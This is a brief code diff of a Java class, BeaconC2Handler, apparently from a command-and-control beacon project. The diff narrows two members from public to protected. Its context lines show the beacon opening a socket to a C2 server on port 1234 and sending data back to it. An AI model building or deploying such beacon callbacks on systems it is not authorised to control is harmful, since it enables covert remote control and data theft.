@@ -24,7 +24,7 @@ public class BeaconC2Handler implements Runnable{
      * @param C2ServerIPAddress The IP Address of the C2 Server
      * @throws IOException
      */
-    public BeaconC2Handler(BeaconServer beaconServer, String C2ServerIPAddress, String passwordDigest) throws IOException{
+    protected BeaconC2Handler(BeaconServer beaconServer, String C2ServerIPAddress, String passwordDigest) throws IOException{
         this.beaconServer = beaconServer;
         Socket socket = new Socket(C2ServerIPAddress, 1234);
         this.C2Server = new Duplexer(socket);
@@ -37,7 +37,7 @@ public class BeaconC2Handler implements Runnable{
      * 
      * @param Data The Data to be sent back to the C2 Server
      */
-    public void sendDataToC2Server(String Data){
+    protected void sendDataToC2Server(String Data){
         C2Server.send(Data);
     }
 
